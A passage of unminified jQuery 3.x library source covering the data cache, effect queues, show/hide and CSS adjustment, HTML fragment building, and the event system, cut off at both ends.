              } else {
                  key = jQuery.camelCase( key );

                  // If a key with the spaces exists, use it.
                  // Otherwise, create an array by matching non-whitespace
                  key = key in cache ?
                      [ key ] :
                      ( key.match( rnothtmlwhite ) || [] );
              }

              i = key.length;

              while ( i-- ) {
                  delete cache[ key[ i ] ];
              }
          }

          // Remove the expando if there's no more data
          if ( key === undefined || jQuery.isEmptyObject( cache ) ) {

              // Support: Chrome <=35 - 45
              // Webkit & Blink performance suffers when deleting properties
              // from DOM nodes, so set to undefined instead
              // https://bugs.chromium.org/p/chromium/issues/detail?id=378607 (bug restricted)
              if ( owner.nodeType ) {
                  owner[ this.expando ] = undefined;
              } else {
                  delete owner[ this.expando ];
              }
          }
      },
      hasData: function( owner ) {
          var cache = owner[ this.expando ];
          return cache !== undefined && !jQuery.isEmptyObject( cache );
      }
  };
  var dataPriv = new Data();

  var dataUser = new Data();



  //	Implementation Summary
  //
  //	1. Enforce API surface and semantic compatibility with 1.9.x branch
  //	2. Improve the module's maintainability by reducing the storage
  //		paths to a single mechanism.
  //	3. Use the same single mechanism to support "private" and "user" data.
  //	4. _Never_ expose "private" data to user code (TODO: Drop _data, _removeData)
  //	5. Avoid exposing implementation details on user objects (eg. expando properties)
  //	6. Provide a clear path for implementation upgrade to WeakMap in 2014

  var rbrace = /^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,
      rmultiDash = /[A-Z]/g;

  function getData( data ) {
      if ( data === "true" ) {
          return true;
      }

      if ( data === "false" ) {
          return false;
      }

      if ( data === "null" ) {
          return null;
      }

      // Only convert to a number if it doesn't change the string
      if ( data === +data + "" ) {
          return +data;
      }

      if ( rbrace.test( data ) ) {
          return JSON.parse( data );
      }

      return data;
  }

  function dataAttr( elem, key, data ) {
      var name;

      // If nothing was found internally, try to fetch any
      // data from the HTML5 data-* attribute
      if ( data === undefined && elem.nodeType === 1 ) {
          name = "data-" + key.replace( rmultiDash, "-$&" ).toLowerCase();
          data = elem.getAttribute( name );

          if ( typeof data === "string" ) {
              try {
                  data = getData( data );
              } catch ( e ) {}

              // Make sure we set the data so it isn't changed later
              dataUser.set( elem, key, data );
          } else {
              data = undefined;
          }
      }
      return data;
  }

  jQuery.extend( {
      hasData: function( elem ) {
          return dataUser.hasData( elem ) || dataPriv.hasData( elem );
      },

      data: function( elem, name, data ) {
          return dataUser.access( elem, name, data );
      },

      removeData: function( elem, name ) {
          dataUser.remove( elem, name );
      },

      // TODO: Now that all calls to _data and _removeData have been replaced
      // with direct calls to dataPriv methods, these can be deprecated.
      _data: function( elem, name, data ) {
          return dataPriv.access( elem, name, data );
      },

      _removeData: function( elem, name ) {
          dataPriv.remove( elem, name );
      }
  } );

  jQuery.fn.extend( {
      data: function( key, value ) {
          var i, name, data,
              elem = this[ 0 ],
              attrs = elem && elem.attributes;

          // Gets all values
          if ( key === undefined ) {
              if ( this.length ) {
                  data = dataUser.get( elem );

                  if ( elem.nodeType === 1 && !dataPriv.get( elem, "hasDataAttrs" ) ) {
                      i = attrs.length;
                      while ( i-- ) {

                          // Support: IE 11 only
                          // The attrs elements can be null (#14894)
                          if ( attrs[ i ] ) {
                              name = attrs[ i ].name;
                              if ( name.indexOf( "data-" ) === 0 ) {
                                  name = jQuery.camelCase( name.slice( 5 ) );
                                  dataAttr( elem, name, data[ name ] );
                              }
                          }
                      }
                      dataPriv.set( elem, "hasDataAttrs", true );
                  }
              }

              return data;
          }

          // Sets multiple values
          if ( typeof key === "object" ) {
              return this.each( function() {
                  dataUser.set( this, key );
              } );
          }

          return access( this, function( value ) {
              var data;

              // The calling jQuery object (element matches) is not empty
              // (and therefore has an element appears at this[ 0 ]) and the
              // `value` parameter was not undefined. An empty jQuery object
              // will result in `undefined` for elem = this[ 0 ] which will
              // throw an exception if an attempt to read a data cache is made.
              if ( elem && value === undefined ) {

                  // Attempt to get data from the cache
                  // The key will always be camelCased in Data
                  data = dataUser.get( elem, key );
                  if ( data !== undefined ) {
                      return data;
                  }

                  // Attempt to "discover" the data in
                  // HTML5 custom data-* attrs
                  data = dataAttr( elem, key );
                  if ( data !== undefined ) {
                      return data;
                  }

                  // We tried really hard, but the data doesn't exist.
                  return;
              }

              // Set the data...
              this.each( function() {

                  // We always store the camelCased key
                  dataUser.set( this, key, value );
              } );
          }, null, value, arguments.length > 1, null, true );
      },

      removeData: function( key ) {
          return this.each( function() {
              dataUser.remove( this, key );
          } );
      }
  } );


  jQuery.extend( {
      queue: function( elem, type, data ) {
          var queue;

          if ( elem ) {
              type = ( type || "fx" ) + "queue";
              queue = dataPriv.get( elem, type );

              // Speed up dequeue by getting out quickly if this is just a lookup
              if ( data ) {
                  if ( !queue || Array.isArray( data ) ) {
                      queue = dataPriv.access( elem, type, jQuery.makeArray( data ) );
                  } else {
                      queue.push( data );
                  }
              }
              return queue || [];
          }
      },

      dequeue: function( elem, type ) {
          type = type || "fx";

          var queue = jQuery.queue( elem, type ),
              startLength = queue.length,
              fn = queue.shift(),
              hooks = jQuery._queueHooks( elem, type ),
              next = function() {
                  jQuery.dequeue( elem, type );
              };

          // If the fx queue is dequeued, always remove the progress sentinel
          if ( fn === "inprogress" ) {
              fn = queue.shift();
              startLength--;
          }

          if ( fn ) {

              // Add a progress sentinel to prevent the fx queue from being
              // automatically dequeued
              if ( type === "fx" ) {
                  queue.unshift( "inprogress" );
              }

              // Clear up the last queue stop function
              delete hooks.stop;
              fn.call( elem, next, hooks );
          }

          if ( !startLength && hooks ) {
              hooks.empty.fire();
          }
      },

      // Not public - generate a queueHooks object, or return the current one
      _queueHooks: function( elem, type ) {
          var key = type + "queueHooks";
          return dataPriv.get( elem, key ) || dataPriv.access( elem, key, {
              empty: jQuery.Callbacks( "once memory" ).add( function() {
                  dataPriv.remove( elem, [ type + "queue", key ] );
              } )
          } );
      }
  } );

  jQuery.fn.extend( {
      queue: function( type, data ) {
          var setter = 2;

          if ( typeof type !== "string" ) {
              data = type;
              type = "fx";
              setter--;
          }

          if ( arguments.length < setter ) {
              return jQuery.queue( this[ 0 ], type );
          }

          return data === undefined ?
              this :
              this.each( function() {
                  var queue = jQuery.queue( this, type, data );

                  // Ensure a hooks for this queue
                  jQuery._queueHooks( this, type );

                  if ( type === "fx" && queue[ 0 ] !== "inprogress" ) {
                      jQuery.dequeue( this, type );
                  }
              } );
      },
      dequeue: function( type ) {
          return this.each( function() {
              jQuery.dequeue( this, type );
          } );
      },
      clearQueue: function( type ) {
          return this.queue( type || "fx", [] );
      },

      // Get a promise resolved when queues of a certain type
      // are emptied (fx is the type by default)
      promise: function( type, obj ) {
          var tmp,
              count = 1,
              defer = jQuery.Deferred(),
              elements = this,
              i = this.length,
              resolve = function() {
                  if ( !( --count ) ) {
                      defer.resolveWith( elements, [ elements ] );
                  }
              };

          if ( typeof type !== "string" ) {
              obj = type;
              type = undefined;
          }
          type = type || "fx";

          while ( i-- ) {
              tmp = dataPriv.get( elements[ i ], type + "queueHooks" );
              if ( tmp && tmp.empty ) {
                  count++;
                  tmp.empty.add( resolve );
              }
          }
          resolve();
          return defer.promise( obj );
      }
  } );
  var pnum = ( /[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/ ).source;

  var rcssNum = new RegExp( "^(?:([+-])=|)(" + pnum + ")([a-z%]*)$", "i" );


  var cssExpand = [ "Top", "Right", "Bottom", "Left" ];

  var isHiddenWithinTree = function( elem, el ) {

          // isHiddenWithinTree might be called from jQuery#filter function;
          // in that case, element will be second argument
          elem = el || elem;

          // Inline style trumps all
          return elem.style.display === "none" ||
              elem.style.display === "" &&

              // Otherwise, check computed style
              // Support: Firefox <=43 - 45
              // Disconnected elements can have computed display: none, so first confirm that elem is
              // in the document.
              jQuery.contains( elem.ownerDocument, elem ) &&

              jQuery.css( elem, "display" ) === "none";
      };

  var swap = function( elem, options, callback, args ) {
      var ret, name,
          old = {};

      // Remember the old values, and insert the new ones
      for ( name in options ) {
          old[ name ] = elem.style[ name ];
          elem.style[ name ] = options[ name ];
      }

      ret = callback.apply( elem, args || [] );

      // Revert the old values
      for ( name in options ) {
          elem.style[ name ] = old[ name ];
      }

      return ret;
  };




  function adjustCSS( elem, prop, valueParts, tween ) {
      var adjusted,
          scale = 1,
          maxIterations = 20,
          currentValue = tween ?
              function() {
                  return tween.cur();
              } :
              function() {
                  return jQuery.css( elem, prop, "" );
              },
          initial = currentValue(),
          unit = valueParts && valueParts[ 3 ] || ( jQuery.cssNumber[ prop ] ? "" : "px" ),

          // Starting value computation is required for potential unit mismatches
          initialInUnit = ( jQuery.cssNumber[ prop ] || unit !== "px" && +initial ) &&
              rcssNum.exec( jQuery.css( elem, prop ) );

      if ( initialInUnit && initialInUnit[ 3 ] !== unit ) {

          // Trust units reported by jQuery.css
          unit = unit || initialInUnit[ 3 ];

          // Make sure we update the tween properties later on
          valueParts = valueParts || [];

          // Iteratively approximate from a nonzero starting point
          initialInUnit = +initial || 1;

          do {

              // If previous iteration zeroed out, double until we get *something*.
              // Use string for doubling so we don't accidentally see scale as unchanged below
              scale = scale || ".5";

              // Adjust and apply
              initialInUnit = initialInUnit / scale;
              jQuery.style( elem, prop, initialInUnit + unit );

          // Update scale, tolerating zero or NaN from tween.cur()
          // Break the loop if scale is unchanged or perfect, or if we've just had enough.
          } while (
              scale !== ( scale = currentValue() / initial ) && scale !== 1 && --maxIterations
          );
      }

      if ( valueParts ) {
          initialInUnit = +initialInUnit || +initial || 0;

          // Apply relative offset (+=/-=) if specified
          adjusted = valueParts[ 1 ] ?
              initialInUnit + ( valueParts[ 1 ] + 1 ) * valueParts[ 2 ] :
              +valueParts[ 2 ];
          if ( tween ) {
              tween.unit = unit;
              tween.start = initialInUnit;
              tween.end = adjusted;
          }
      }
      return adjusted;
  }


  var defaultDisplayMap = {};

  function getDefaultDisplay( elem ) {
      var temp,
          doc = elem.ownerDocument,
          nodeName = elem.nodeName,
          display = defaultDisplayMap[ nodeName ];

      if ( display ) {
          return display;
      }

      temp = doc.body.appendChild( doc.createElement( nodeName ) );
      display = jQuery.css( temp, "display" );

      temp.parentNode.removeChild( temp );

      if ( display === "none" ) {
          display = "block";
      }
      defaultDisplayMap[ nodeName ] = display;

      return display;
  }

  function showHide( elements, show ) {
      var display, elem,
          values = [],
          index = 0,
          length = elements.length;

      // Determine new display value for elements that need to change
      for ( ; index < length; index++ ) {
          elem = elements[ index ];
          if ( !elem.style ) {
              continue;
          }

          display = elem.style.display;
          if ( show ) {

              // Since we force visibility upon cascade-hidden elements, an immediate (and slow)
              // check is required in this first loop unless we have a nonempty display value (either
              // inline or about-to-be-restored)
              if ( display === "none" ) {
                  values[ index ] = dataPriv.get( elem, "display" ) || null;
                  if ( !values[ index ] ) {
                      elem.style.display = "";
                  }
              }
              if ( elem.style.display === "" && isHiddenWithinTree( elem ) ) {
                  values[ index ] = getDefaultDisplay( elem );
              }
          } else {
              if ( display !== "none" ) {
                  values[ index ] = "none";

                  // Remember what we're overwriting
                  dataPriv.set( elem, "display", display );
              }
          }
      }

      // Set the display of the elements in a second loop to avoid constant reflow
      for ( index = 0; index < length; index++ ) {
          if ( values[ index ] != null ) {
              elements[ index ].style.display = values[ index ];
          }
      }

      return elements;
  }

  jQuery.fn.extend( {
      show: function() {
          return showHide( this, true );
      },
      hide: function() {
          return showHide( this );
      },
      toggle: function( state ) {
          if ( typeof state === "boolean" ) {
              return state ? this.show() : this.hide();
          }

          return this.each( function() {
              if ( isHiddenWithinTree( this ) ) {
                  jQuery( this ).show();
              } else {
                  jQuery( this ).hide();
              }
          } );
      }
  } );
  var rcheckableType = ( /^(?:checkbox|radio)$/i );

  var rtagName = ( /<([a-z][^\/\0>\x20\t\r\n\f]+)/i );

  var rscriptType = ( /^$|\/(?:java|ecma)script/i );



  // We have to close these tags to support XHTML (#13200)
  var wrapMap = {

      // Support: IE <=9 only
      option: [ 1, "<select multiple='multiple'>", "</select>" ],

      // XHTML parsers do not magically insert elements in the
      // same way that tag soup parsers do. So we cannot shorten
      // this by omitting <tbody> or other required elements.
      thead: [ 1, "<table>", "</table>" ],
      col: [ 2, "<table><colgroup>", "</colgroup></table>" ],
      tr: [ 2, "<table><tbody>", "</tbody></table>" ],
      td: [ 3, "<table><tbody><tr>", "</tr></tbody></table>" ],

      _default: [ 0, "", "" ]
  };

  // Support: IE <=9 only
  wrapMap.optgroup = wrapMap.option;

  wrapMap.tbody = wrapMap.tfoot = wrapMap.colgroup = wrapMap.caption = wrapMap.thead;
  wrapMap.th = wrapMap.td;


  function getAll( context, tag ) {

      // Support: IE <=9 - 11 only
      // Use typeof to avoid zero-argument method invocation on host objects (#15151)
      var ret;

      if ( typeof context.getElementsByTagName !== "undefined" ) {
          ret = context.getElementsByTagName( tag || "*" );

      } else if ( typeof context.querySelectorAll !== "undefined" ) {
          ret = context.querySelectorAll( tag || "*" );

      } else {
          ret = [];
      }

      if ( tag === undefined || tag && nodeName( context, tag ) ) {
          return jQuery.merge( [ context ], ret );
      }

      return ret;
  }


  // Mark scripts as having already been evaluated
  function setGlobalEval( elems, refElements ) {
      var i = 0,
          l = elems.length;

      for ( ; i < l; i++ ) {
          dataPriv.set(
              elems[ i ],
              "globalEval",
              !refElements || dataPriv.get( refElements[ i ], "globalEval" )
          );
      }
  }


  var rhtml = /<|&#?\w+;/;

  function buildFragment( elems, context, scripts, selection, ignored ) {
      var elem, tmp, tag, wrap, contains, j,
          fragment = context.createDocumentFragment(),
          nodes = [],
          i = 0,
          l = elems.length;

      for ( ; i < l; i++ ) {
          elem = elems[ i ];

          if ( elem || elem === 0 ) {

              // Add nodes directly
              if ( jQuery.type( elem ) === "object" ) {

                  // Support: Android <=4.0 only, PhantomJS 1 only
                  // push.apply(_, arraylike) throws on ancient WebKit
                  jQuery.merge( nodes, elem.nodeType ? [ elem ] : elem );

              // Convert non-html into a text node
              } else if ( !rhtml.test( elem ) ) {
                  nodes.push( context.createTextNode( elem ) );

              // Convert html into DOM nodes
              } else {
                  tmp = tmp || fragment.appendChild( context.createElement( "div" ) );

                  // Deserialize a standard representation
                  tag = ( rtagName.exec( elem ) || [ "", "" ] )[ 1 ].toLowerCase();
                  wrap = wrapMap[ tag ] || wrapMap._default;
                  tmp.innerHTML = wrap[ 1 ] + jQuery.htmlPrefilter( elem ) + wrap[ 2 ];

                  // Descend through wrappers to the right content
                  j = wrap[ 0 ];
                  while ( j-- ) {
                      tmp = tmp.lastChild;
                  }

                  // Support: Android <=4.0 only, PhantomJS 1 only
                  // push.apply(_, arraylike) throws on ancient WebKit
                  jQuery.merge( nodes, tmp.childNodes );

                  // Remember the top-level container
                  tmp = fragment.firstChild;

                  // Ensure the created nodes are orphaned (#12392)
                  tmp.textContent = "";
              }
          }
      }

      // Remove wrapper from fragment
      fragment.textContent = "";

      i = 0;
      while ( ( elem = nodes[ i++ ] ) ) {

          // Skip elements already in the context collection (trac-4087)
          if ( selection && jQuery.inArray( elem, selection ) > -1 ) {
              if ( ignored ) {
                  ignored.push( elem );
              }
              continue;
          }

          contains = jQuery.contains( elem.ownerDocument, elem );

          // Append to fragment
          tmp = getAll( fragment.appendChild( elem ), "script" );

          // Preserve script evaluation history
          if ( contains ) {
              setGlobalEval( tmp );
          }

          // Capture executables
          if ( scripts ) {
              j = 0;
              while ( ( elem = tmp[ j++ ] ) ) {
                  if ( rscriptType.test( elem.type || "" ) ) {
                      scripts.push( elem );
                  }
              }
          }
      }

      return fragment;
  }


  ( function() {
      var fragment = document.createDocumentFragment(),
          div = fragment.appendChild( document.createElement( "div" ) ),
          input = document.createElement( "input" );

      // Support: Android 4.0 - 4.3 only
      // Check state lost if the name is set (#11217)
      // Support: Windows Web Apps (WWA)
      // `name` and `type` must use .setAttribute for WWA (#14901)
      input.setAttribute( "type", "radio" );
      input.setAttribute( "checked", "checked" );
      input.setAttribute( "name", "t" );

      div.appendChild( input );

      // Support: Android <=4.1 only
      // Older WebKit doesn't clone checked state correctly in fragments
      support.checkClone = div.cloneNode( true ).cloneNode( true ).lastChild.checked;

      // Support: IE <=11 only
      // Make sure textarea (and checkbox) defaultValue is properly cloned
      div.innerHTML = "<textarea>x</textarea>";
      support.noCloneChecked = !!div.cloneNode( true ).lastChild.defaultValue;
  } )();
  var documentElement = document.documentElement;



  var
      rkeyEvent = /^key/,
      rmouseEvent = /^(?:mouse|pointer|contextmenu|drag|drop)|click/,
      rtypenamespace = /^([^.]*)(?:\.(.+)|)/;

  function returnTrue() {
      return true;
  }

  function returnFalse() {
      return false;
  }

  // Support: IE <=9 only
  // See #13393 for more info
  function safeActiveElement() {
      try {
          return document.activeElement;
      } catch ( err ) { }
  }

  function on( elem, types, selector, data, fn, one ) {
      var origFn, type;

      // Types can be a map of types/handlers
      if ( typeof types === "object" ) {

          // ( types-Object, selector, data )
          if ( typeof selector !== "string" ) {

              // ( types-Object, data )
              data = data || selector;
              selector = undefined;
          }
          for ( type in types ) {
              on( elem, type, selector, data, types[ type ], one );
          }
          return elem;
      }

      if ( data == null && fn == null ) {

          // ( types, fn )
          fn = selector;
          data = selector = undefined;
      } else if ( fn == null ) {
          if ( typeof selector === "string" ) {

              // ( types, selector, fn )
              fn = data;
              data = undefined;
          } else {

              // ( types, data, fn )
              fn = data;
              data = selector;
              selector = undefined;
          }
      }
      if ( fn === false ) {
          fn = returnFalse;
      } else if ( !fn ) {
          return elem;
      }

      if ( one === 1 ) {
          origFn = fn;
          fn = function( event ) {

              // Can use an empty set, since event contains the info
              jQuery().off( event );
              return origFn.apply( this, arguments );
          };

          // Use same guid so caller can remove using origFn
          fn.guid = origFn.guid || ( origFn.guid = jQuery.guid++ );
      }
      return elem.each( function() {
          jQuery.event.add( this, types, fn, data, selector );
      } );
  }

  /*
   * Helper functions for managing events -- not part of the public interface.
   * Props to Dean Edwards' addEvent library for many of the ideas.
   */
  jQuery.event = {

      global: {},

      add: function( elem, types, handler, data, selector ) {

          var handleObjIn, eventHandle, tmp,
              events, t, handleObj,
              special, handlers, type, namespaces, origType,
              elemData = dataPriv.get( elem );

          // Don't attach events to noData or text/comment nodes (but allow plain objects)
          if ( !elemData ) {
              return;
          }

          // Caller can pass in an object of custom data in lieu of the handler
          if ( handler.handler ) {
              handleObjIn = handler;
              handler = handleObjIn.handler;
              selector = handleObjIn.selector;
          }

          // Ensure that invalid selectors throw exceptions at attach time
          // Evaluate against documentElement in case elem is a non-element node (e.g., document)
          if ( selector ) {
              jQuery.find.matchesSelector( documentElement, selector );
          }

          // Make sure that the handler has a unique ID, used to find/remove it later
          if ( !handler.guid ) {
              handler.guid = jQuery.guid++;
          }

          // Init the element's event structure and main handler, if this is the first
          if ( !( events = elemData.events ) ) {
              events = elemData.events = {};
          }
          if ( !( eventHandle = elemData.handle ) ) {
              eventHandle = elemData.handle = function( e ) {

                  // Discard the second event of a jQuery.event.trigger() and
                  // when an event is called after a page has unloaded
                  return typeof jQuery !== "undefined" && jQuery.event.triggered !== e.type ?
                      jQuery.event.dispatch.apply( elem, arguments ) : undefined;
              };
          }

          // Handle multiple events separated by a space
          types = ( types || "" ).match( rnothtmlwhite ) || [ "" ];
          t = types.length;
          while ( t-- ) {
              tmp = rtypenamespace.exec( types[ t ] ) || [];
              type = origType = tmp[ 1 ];
              namespaces = ( tmp[ 2 ] || "" ).split( "." ).sort();

              // There *must* be a type, no attaching namespace-only handlers
              if ( !type ) {
                  continue;
              }

              // If event changes its type, use the special event handlers for the changed type
              special = jQuery.event.special[ type ] || {};

              // If selector defined, determine special event api type, otherwise given type
              type = ( selector ? special.delegateType : special.bindType ) || type;

              // Update special based on newly reset type
              special = jQuery.event.special[ type ] || {};

              // handleObj is passed to all event handlers
              handleObj = jQuery.extend( {
                  type: type,
                  origType: origType,
                  data: data,
                  handler: handler,
                  guid: handler.guid,
                  selector: selector,
                  needsContext: selector && jQuery.expr.match.needsContext.test( selector ),
                  namespace: namespaces.join( "." )
              }, handleObjIn );

              // Init the event handler queue if we're the first
              if ( !( handlers = events[ type ] ) ) {
                  handlers = events[ type ] = [];
                  handlers.delegateCount = 0;

                  // Only use addEventListener if the special events handler returns false
                  if ( !special.setup ||
                      special.setup.call( elem, data, namespaces, eventHandle ) === false ) {

                      if ( elem.addEventListener ) {
                          elem.addEventListener( type, eventHandle );
                      }
                  }
              }

              if ( special.add ) {
                  special.add.call( elem, handleObj );

                  if ( !handleObj.handler.guid ) {
                      handleObj.handler.guid = handler.guid;
                  }
              }

              // Add to the element's handler list, delegates in front
              if ( selector ) {
                  handlers.splice( handlers.delegateCount++, 0, handleObj );
              } else {
                  handlers.push( handleObj );
              }

              // Keep track of which events have ever been used, for event optimization
              jQuery.event.global[ type ] = true;
          }

      },

      // Detach an event or set of events from an element
      remove: function( elem, types, handler, selector, mappedTypes ) {

          var j, origCount, tmp,
              events, t, handleObj,
              special, handlers, type, namespaces, origType,
              elemData = dataPriv.hasData( elem ) && dataPriv.get( elem );

          if ( !elemData || !( events = elemData.events ) ) {
              return;
          }

          // Once for each type.namespace in types; type may be omitted
          types = ( types || "" ).match( rnothtmlwhite ) || [ "" ];
          t = types.length;
          while ( t-- ) {
              tmp = rtypenamespace.exec( types[ t ] ) || [];
              type = origType = tmp[ 1 ];
              namespaces = ( tmp[ 2 ] || "" ).split( "." ).sort();

              // Unbind all events (on this namespace, if provided) for the element
              if ( !type ) {
                  for ( type in events ) {
                      jQuery.event.remove( elem, type + types[ t ], handler, selector, true );
                  }
                  continue;
              }

              special = jQuery.event.special[ type ] || {};
              type = ( selector ? special.delegateType : special.bindType ) || type;
              handlers = events[ type ] || [];
              tmp = tmp[ 2 ] &&
                  new RegExp( "(^|\\.)" + namespaces.join( "\\.(?:.*\\.|)" ) + "(\\.|$)" );

              // Remove matching events
              origCount = j = handlers.length;
              while ( j-- ) {
                  handleObj = handlers[ j ];

                  if ( ( mappedTypes || origType === handleObj.origType ) &&
                      ( !handler || handler.guid === handleObj.guid ) &&
                      ( !tmp || tmp.test( handleObj.namespace ) ) &&
                      ( !selector || selector === handleObj.selector ||
                          selector === "**" && handleObj.selector ) ) {
                      handlers.splice( j, 1 );

                      if ( handleObj.selector ) {
                          handlers.delegateCount--;
                      }
                      if ( special.remove ) {
                          special.remove.call( elem, handleObj );
                      }
                  }
              }

              // Remove generic event handler if we removed something and no more handlers exist
              // (avoids potential for endless recursion during removal of special event handlers)
              if ( origCount && !handlers.length ) {
                  if ( !special.teardown ||
                      special.teardown.call( elem, namespaces, elemData.handle ) === false ) {

                      jQuery.removeEvent( elem, type, elemData.handle );
                  }

                  delete events[ type ];
              }
          }

          // Remove data and the expando if it's no longer used
          if ( jQuery.isEmptyObject( events ) ) {
              dataPriv.remove( elem, "handle events" );
          }
      },

      dispatch: function( nativeEvent ) {

          // Make a writable jQuery.Event from the native event object
          var event = jQuery.event.fix( nativeEvent );

          var i, j, ret, matched, handleObj, handlerQueue,
              args = new Array( arguments.length ),
              handlers = ( dataPriv.get( this, "events" ) || {} )[ event.type ] || [],
              special = jQuery.event.special[ event.type ] || {};

          // Use the fix-ed jQuery.Event rather than the (read-only) native event
          args[ 0 ] = event;

          for ( i = 1; i < arguments.length; i++ ) {
              args[ i ] = arguments[ i ];
          }

          event.delegateTarget = this;

          // Call the preDispatch hook for the mapped type, and let it bail if desired
          if ( special.preDispatch && special.preDispatch.call( this, event ) === false ) {
              return;
          }

          // Determine handlers
          handlerQueue = jQuery.event.handlers.call( this, event, handlers );

          // Run delegates first; they may want to stop propagation beneath us
          i = 0;
          while ( ( matched = handlerQueue[ i++ ] ) && !event.isPropagationStopped() ) {
              event.currentTarget = matched.elem;

              j = 0;
              while ( ( handleObj = matched.handlers[ j++ ] ) &&
                  !event.isImmediatePropagationStopped() ) {

                  // Triggered event must either 1) have no namespace, or 2) have namespace(s)
                  // a subset or equal to those in the bound event (both can have no namespace).
                  if ( !event.rnamespace || event.rnamespace.test( handleObj.namespace ) ) {

                      event.handleObj = handleObj;
                      event.data = handleObj.data;

                      ret = ( ( jQuery.event.special[ handleObj.origType ] || {} ).handle ||
                          handleObj.handler ).apply( matched.elem, args );

                      if ( ret !== undefined ) {
                          if ( ( event.result = ret ) === false ) {
                              event.preventDefault();
                              event.stopPropagation();
                          }
                      }
                  }
              }
          }

          // Call the postDispatch hook for the mapped type
          if ( special.postDispatch ) {
              special.postDispatch.call( this, event );
          }

          return event.result;
      },

      handlers: function( event, handlers ) {
          var i, handleObj, sel, matchedHandlers, matchedSelectors,
              handlerQueue = [],
              delegateCount = handlers.delegateCount,
              cur = event.target;

          // Find delegate handlers
          if ( delegateCount &&

              // Support: IE <=9
              // Black-hole SVG <use> instance trees (trac-13180)
              cur.nodeType &&

              // Support: Firefox <=42
              // Suppress spec-violating clicks indicating a non-primary pointer button (trac-3861)
              // https://www.w3.org/TR/DOM-Level-3-Events/#event-type-click
              // Support: IE 11 only
              // ...but not arrow key "clicks" of radio inputs, which can have `button` -1 (gh-2343)
              !( event.type === "click" && event.button >= 1 ) ) {

              for ( ; cur !== this; cur = cur.parentNode || this ) {

                  // Don't check non-elements (#13208)
                  // Don't process clicks on disabled elements (#6911, #8165, #11382, #11764)
                  if ( cur.nodeType === 1 && !( event.type === "click" && cur.disabled === true ) ) {
                      matchedHandlers = [];
                      matchedSelectors = {};
                      for ( i = 0; i < delegateCount; i++ ) {
                          handleObj = handlers[ i ];

                          // Don't conflict with Object.prototype properties (#13203)
                          sel = handleObj.selector + " ";

                          if ( matchedSelectors[ sel ] === undefined ) {
                              matchedSelectors[ sel ] = handleObj.needsContext ?
                                  jQuery( sel, this ).index( cur ) > -1 :
                                  jQuery.find( sel, this, null, [ cur ] ).length;
                          }
                          if ( matchedSelectors[ sel ] ) {
                              matchedHandlers.push( handleObj );
                          }
                      }
                      if ( matchedHandlers.length ) {
                          handlerQueue.push( { elem: cur, handlers: matchedHandlers } );
                      }
                  }
              }
          }

          // Add the remaining (directly-bound) handlers
          cur = this;
          if ( delegateCount < handlers.length ) {
              handlerQueue.push( { elem: cur, handlers: handlers.slice( delegateCount ) } );
          }

          return handlerQueue;
      },

      addProp: function( name, hook ) {
          Object.defineProperty( jQuery.Event.prototype, name, {
              enumerable: true,
              configurable: true,

              get: jQuery.isFunction( hook ) ?
                  function() {
                      if ( this.originalEvent ) {
                              return hook( this.originalEvent );
                      }
                  } :
                  function() {
                      if ( this.originalEvent ) {
                              return this.originalEvent[ name ];
                      }
                  },

              set: function( value ) {
                  Object.defineProperty( this, name, {
                      enumerable: true,
                      configurable: true,
                      writable: true,
                      value: value
                  } );
              }
          } );
      },

      fix: function( originalEvent ) {
          return originalEvent[ jQuery.expando ] ?
              originalEvent :
              new jQuery.Event( originalEvent );
      },

      special: {
          load: {

              // Prevent triggered image.load events from bubbling to window.load
              noBubble: true
          },
          focus: {

              // Fire native event if possible so blur/focus sequence is correct
              trigger: function() {
                  if ( this !== safeActiveElement() && this.focus ) {
                      this.focus();
                      return false;
                  }
              },
              delegateType: "focusin"
          },
          blur: {
              trigger: function() {
                  if ( this === safeActiveElement() && this.blur ) {
                      this.blur();
                      return false;
                  }
              },
              delegateType: "focusout"
          },
          click: {

              // For checkbox, fire native event so checked state will be right
              trigger: function() {
                  if ( this.type === "checkbox" && this.click && nodeName( this, "input" ) ) {
                      this.click();
                      return false;
                  }
              },

              // For cross-browser consistency, don't fire native .click() on links
              _default: function( event ) {
                  return nodeName( event.target, "a" );
              }
          },

          beforeunload: {
              postDispatch: function( event ) {

                  // Support: Firefox 20+
                  // Firefox doesn't alert if the returnValue field is not set.
                  if ( event.result !== undefined && event.originalEvent ) {
                      event.originalEvent.returnValue = event.result;
                  }
              }
          }
      }
  };

  jQuery.removeEvent = function( elem, type, handle ) {

      // This "if" is needed for plain objects
      if ( elem.removeEventListener ) {
          elem.removeEventListener( type, handle );
      }
  };

  jQuery.Event = function( src, props ) {

      // Allow instantiation without the 'new' keyword
      if ( !( this instanceof jQuery.Event ) ) {
          return new jQuery.Event( src, props );
      }

      // Event object
      if ( src && src.type ) {
          this.originalEvent = src;
          this.type = src.type;

          // Events bubbling up the document may have been marked as prevented
          // by a handler lower down the tree; reflect the correct value.
          this.isDefaultPrevented = src.defaultPrevented ||
                  src.defaultPrevented === undefined &&

                  // Support: Android <=2.3 only
                  src.returnValue === false ?
              returnTrue :
              returnFalse;

          // Create target properties
          // Support: Safari <=6 - 7 only
          // Target should not be a text node (#504, #13143)
          this.target = ( src.target && src.target.nodeType === 3 ) ?
              src.target.parentNode :
              src.target;

          this.currentTarget = src.currentTarget;
          this.relatedTarget = src.relatedTarget;

      // Event type
      } else {
          this.type = src;
      }

      // Put explicitly provided properties onto the event object
      if ( props ) {
          jQuery.extend( this, props );
      }

      // Create a timestamp if incoming event doesn't have one
      this.timeStamp = src && src.timeStamp || jQuery.now();

      // Mark it as fixed
      this[ jQuery.expando ] = true;
  };

  // jQuery.Event is based on DOM3 Events as specified by the ECMAScript Language Binding
  // https://www.w3.org/TR/2003/WD-DOM-Level-3-Events-20030331/ecma-script-binding.html
  jQuery.Event.prototype = {
      constructor: jQuery.Event,
      isDefaultPrevented: returnFalse,
      isPropagationStopped: returnFalse,
      isImmediatePropagationStopped: returnFalse,
      isSimulated: false,

      preventDefault: function() {
          var e = this.originalEvent;

          this.isDefaultPrevented = returnTrue;

          if ( e && !this.isSimulated ) {
              e.preventDefault();
          }
      },
      stopPropagation: function() {
          var e = this.originalEvent;

          this.isPropagationStopped = returnTrue;

          if ( e && !this.isSimulated ) {
              e.stopPropagation();
          }
      },
      stopImmediatePropagation: function() {
          var e = this.originalEvent;

          this.isImmediatePropagationStopped = returnTrue;

          if ( e && !this.isSimulated ) {
              e.stopImmediatePropagation();
          }

          this.stopPropagation();
      }
  };

  // Includes all common event props including KeyEvent and MouseEvent specific props
  jQuery.each( {
